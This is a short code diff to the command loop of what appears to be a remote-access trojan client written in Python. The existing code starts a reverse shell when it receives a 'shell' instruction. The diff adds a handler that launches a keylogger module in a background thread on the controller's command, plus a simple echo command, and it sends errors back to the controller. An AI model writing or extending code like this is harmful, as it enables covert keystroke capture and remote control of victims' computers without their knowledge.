@@ -96,6 +96,10 @@ class client():
                 if instruction == 'shell':
                     print("starting  reverse shell")
                     self.run_module('tcp_shell')
+                elif(str(instruction) == 'g'):
+                    self.connection.send('g'.encode())
+                elif(str(instruction) == 'keylogger'):
+                    threading.Thread(target=self.run_module, args=('keylogger',)).start()
 
             except Exception as e:
                 self.connection.sendall(str(e).encode()) 
